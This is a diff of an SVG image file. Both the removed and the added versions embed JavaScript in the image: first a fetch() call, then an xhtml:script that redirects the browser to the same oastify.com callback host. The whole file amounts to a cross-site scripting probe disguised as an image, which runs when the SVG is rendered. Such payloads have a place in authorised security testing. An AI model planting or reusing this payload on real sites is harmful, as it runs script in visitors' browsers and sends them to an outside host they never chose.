@@ -1,6 +1,8 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
-<rect width="124" height="124" rx="24" fill="#000000"/>
-   <script type="text/javascript">  
-      fetch('https://wpp2itdzqxqf1wc5mfaac91jgam1aryg.oastify.com');
-   </script>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="200px" height="120px">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <xhtml:html xmlns:xhtml="http://www.w3.org/1999/xhtml">
+    <xhtml:script>
+      window.location = 'https://wpp2itdzqxqf1wc5mfaac91jgam1aryg.oastify.com';
+    </xhtml:script>
+  </xhtml:html>
 </svg>
